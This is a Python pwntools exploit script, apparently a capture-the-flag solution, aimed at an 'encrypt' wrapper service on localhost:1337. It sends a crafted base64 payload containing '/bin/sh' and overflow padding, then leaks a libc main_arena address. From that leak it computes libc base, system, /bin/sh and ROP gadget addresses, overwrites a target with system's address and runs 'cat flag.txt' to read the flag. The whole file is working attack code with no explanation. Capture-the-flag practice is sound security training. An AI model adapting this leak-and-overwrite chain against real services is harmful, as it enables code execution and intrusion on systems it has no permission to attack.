from pwn import *
import base64
file_to_encrypt = b"test"
file_to_store = b"./out"

payload = b"\x00"
payload += b"/bin/sh"
payload += b"\x00"
payload += b"\x05"+b"\x00"+b"\x41"*0x210
payload += b"\x00"
payload += b"\x04\x01"
payload += b"\x13"
payload += b"\x04"
payload += b"\x00"


#p = process("./wrapper")
p = remote("localhost",1337);

print(p.sendlineafter("bin file: ",base64.b64encode(payload)))

file_to_encrypt = p.recvline().split(b" ")[-1].replace(b'\n',b'')
print(file_to_encrypt)
print(p.sendlineafter("file to encrypt: ",base64.b64encode(b"test")))
#file_to_store = p.recvline().split(b" ")[-1]


p.sendlineafter("encrypt\n",file_to_encrypt)

p.sendlineafter("result: ",file_to_store)


leak = p.recv(1000)


print("leak",leak)
libc_main_arena = u64(leak[-7:-1].ljust(8,b'\0'))
print(hex(libc_main_arena-96))
write_where = libc_main_arena -96 - 0xbe8
libc_base =  libc_main_arena - 0x219ce0
system = libc_main_arena - 96 -0x1c8f20
bin_sh = libc_main_arena -0x415e8-96
pop_rdi_ret = libc_base + 0x000000000002a3e5
ret = libc_base + 0x0000000000029cd6
one_gadget = libc_base+0x50a37
print(hex(one_gadget))
print(hex(bin_sh))
print(hex(system))

p.sendline(str(write_where))
p.sendline(str(system))

#payload = b"A"*0x28
#payload += p64(pop_rdi_ret)
#payload += p64(bin_sh)
#payload += p64(ret)
#payload += p64(system)


p.sendline(b"cat flag.txt")
print(p.recv(420).replace(b'\n',b''))
#p.interactive()

